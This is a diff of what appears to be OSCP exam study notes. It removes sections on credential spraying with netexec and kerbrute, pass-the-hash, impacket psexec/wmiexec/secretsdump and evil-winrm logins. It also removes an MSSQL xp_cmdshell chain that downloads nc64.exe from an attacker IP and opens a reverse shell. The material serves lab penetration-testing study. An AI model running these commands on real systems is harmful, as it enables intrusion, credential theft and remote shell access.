@@ -783,112 +783,18 @@ netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.
 
 ```
 
-## Netexec - Spray credentials
 
-<aside>
-💡 When all else fails - take a look at this cheat sheet SPIDER MODULE / ALL IN ONE!
 
-</aside>
 
-[https://github.com/seriotonctf/cme-nxc-cheat-sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)
 
-```jsx
-kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122
-```
 
-```jsx
-netexec smb 192.168.226.172 -u anirudh -p SecureHM --shares
-```
 
-```jsx
-netexec smb 172.16.229.254 -u Administrator -H 'b2c03054c306ac8fc5f9d188710b0168' --local-auth
-```
 
-```jsx
-netexec smb 172.16.229.0/24 -u joe -p 'Flowers1' --continue-on-success
-```
 
-```jsx
-netexec rdp 172.16.191.0/24 -u yoshi -p 'Mushroom!' --continue-on-success
-```
-
-```jsx
-netexec winrm 172.16.238.83 -u 'wario' -p 'Mushroom!'
-```
-
-```jsx
-netexec wmi 172.16.238.83 -u 'wario' -p 'Mushroom!'
-```
-
-```jsx
-netexec sql 10.10.137.148 -u sql_svc -p Dolphin1
-
-impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
-EXECUTE sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXECUTE sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-EXECUTE xp_cmdshell 'whoami';
-
-EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
-EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
-```
-
-```jsx
-netexec ssh 10.10.137.148 -u sql_svc -p Dolphin1
-```
-
-```jsx
-netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
-```
-
-## Impacket - Establish connections with credentials
-
-```jsx
-impacket-psexec administrator:']12FIYiy&Frtsz'@192.168.157.122
-```
-
-```jsx
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:1f006e5b3ba84ddc6690f4bb2aa559c8 Administrator@192.168.157.122
-```
-
-```jsx
-lput mimikatz.exe
-lget mimikatz.log
-```
-
-```jsx
-impacket-wmiexec jim:'Castello1!'@192.168.209.189
-```
-
-```jsx
-evil-winrm -i 172.16.238.83 -u 'wario' -p 'Mushroom!'
-```
-
-```jsx
-evil-winrm -i 172.16.134.7 -u 'relia.com\Administrator' -p 'vau!XCKjNQBv2$'
-```
-
-```jsx
-upload <file>
-download <file>
-```
-
-```jsx
-secretsdump.py hutch.offsec/administrator:'9%GR6qN[.#)x4i'@192.168.219.122
-```
-
-```jsx
-impacket-mssqlclient sql_svc@10.10.137.148 -windows-auth
-```
 
 [https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)
 
-## RDP
 
-```jsx
-xfreerdp /u:offsec /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
-xfreerdp /u:offsec /d:oscp.lab /pth:<hash> +clipboard /cert:ignore
 ```
 
 ### TTY windows
